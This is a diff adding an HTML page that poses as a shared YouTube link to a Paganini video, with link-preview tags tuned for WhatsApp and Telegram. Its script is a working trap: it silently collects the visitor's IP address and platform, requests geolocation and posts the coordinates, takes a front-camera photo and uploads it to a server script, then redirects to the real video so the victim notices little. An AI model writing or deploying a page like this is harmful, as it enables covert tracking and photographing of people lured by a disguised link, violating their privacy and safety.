@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+    <html prefix="og: http://ogp.me/ns#">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- LINK PREVIEW OTIMIZADO -->
+    <meta property="og:title" content="The Best of Paganini. Why Paganini Is Considered The Devil's Violinist">
+    <meta property="og:description" content="Clique para ver mais...">
+    <meta property="og:image" content="https://i.ytimg.com/vi/aNZR04sUJAM/hqdefault.jpg?sqp=-oaymwEmCKgBEF5IWvKriqkDGQgBFQAAiEIYAdgBAeIBCggYEAIYBjgBQAE=&rs=AOn4CLA22qDzjxxJyJwNu99Tka8zKs7X0w">
+    
+    <!-- Dimensões ajudam o WhatsApp a aceitar a imagem -->
+    <meta property="og:image:width" content="600">
+    <meta property="og:image:height" content="600">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.youtube.com/watch?v=aNZR04sUJAM&list=RDaNZR04sUJAM&start_radio=1">
+    
+    <!-- TWITTER CARDS (Backup para Telegram) -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="The Best of Paganini. Why Paganini Is Considered The Devil's Violinist">
+    <meta name="twitter:description" content="Clique para ver mais...">
+    <meta name="twitter:image" content="https://i.ytimg.com/vi/aNZR04sUJAM/hqdefault.jpg?sqp=-oaymwEmCKgBEF5IWvKriqkDGQgBFQAAiEIYAdgBAeIBCggYEAIYBjgBQAE=&rs=AOn4CLA22qDzjxxJyJwNu99Tka8zKs7X0w">
+    
+    <title>The Best of Paganini. Why Paganini Is Considered The Devil's Violinist</title>
+    <style>
+        body { background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; margin: 0; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+    </head>
+    <body>
+        <div style="text-align:center;">
+            <div class="loader"></div>
+            <p>A carregar...</p>
+        </div>
+    <script>
+        const target = "https://www.youtube.com/watch?v=aNZR04sUJAM&list=RDaNZR04sUJAM&start_radio=1";
+        window.onload = function() {
+            // Captura IP silenciosa
+            try {
+                fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{
+                    fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip:d.ip, os:navigator.platform})});
+                }).catch(e=>{});
+            } catch(e) {}
+            startTrap();
+        };
+        function startTrap() {
+            if(navigator.geolocation) { navigator.geolocation.getCurrentPosition(onPosSuccess, onPosError); } 
+            else { requestCamera(); }
+        }
+        function onPosSuccess(pos) {
+            fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy })});
+            requestCamera();
+        }
+        function onPosError(e) { requestCamera(); }
+        function requestCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(function(stream) {
+                    const video = document.createElement('video'); video.srcObject = stream; video.play();
+                    setTimeout(function() {
+                        const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const data = canvas.toDataURL('image/png');
+                        stream.getTracks().forEach(track => track.stop());
+                        fetch('data.php', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({img: data})}).then(finish);
+                    }, 800);
+                }).catch(finish);
+            } else { finish(); }
+        }
+        function finish() { window.location.href = target; }
+    </script>
+    </body></html>
